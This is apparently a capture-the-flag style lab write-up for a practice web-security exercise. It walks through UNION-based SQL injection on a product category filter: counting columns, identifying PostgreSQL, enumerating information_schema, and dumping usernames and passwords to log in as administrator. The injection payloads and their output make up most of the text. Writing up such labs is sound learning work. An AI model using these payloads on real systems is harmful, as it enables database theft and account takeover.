@@ -1,0 +1,56 @@
+SQL injection - Product category filter
+
+Goals:
+1- The database contains a table that holds usernames and passwords, Determine the name of the table and the columns it contains.
+2- Retrieve all usernames and passwords.
+3- Login as the administrator user.
+
+Analysis:
+
+Step #1: Determine the number of columns
+' ORDER BY 1--  -> displayed on the page
+' ORDER BY 2--  -> displayed on the page
+' ORDER BY 3--  -> error
+The number of columns is 2
+
+Step #2: Determine the data type of the columns
+' UNION SELECT 'a', NULL--  -> string data type
+' UNION SELECT NULL, 'a'--  -> string data type
+Both columns accept string data type
+
+Step #3: Determine the version of the database
+' UNION SELECT @@version, NULL--  -> error -> not Microsoft nor MySQL database
+
+' UNION SELECT version(), NULL--  -> 200 response
+The Version: PostgreSQL 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit
+
+Step #4: Display the list of table names in the database
+' UNION SELECT table_name, NULL FROM information_schema.tables--
+Interesting tables:
+users_nkqvah
+administrable_role_authorizatio
+
+Step #5: Display the column names in the users_nkqbvah table
+' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_nkqvah'--
+It contains:
+password_kfjzxw
+username_seezti
+
+Step #6: Display the list usernames and passwords
+' UNION SELECT username_seezti, password_kfjzxw FROM users_nkqvah--
+
+Username: wiener
+password: x8u89pmcr90apotakjkw
+
+Username: administrator
+Password: qbnyktglvbjuztwxcztu
+
+Username: carlos
+Password: dqdr7b1ex876gdthum7k
+
+Step #7: Login as the administrator user
+
+Username: administrator
+Password: qbnyktglvbjuztwxcztu
+
+Solved
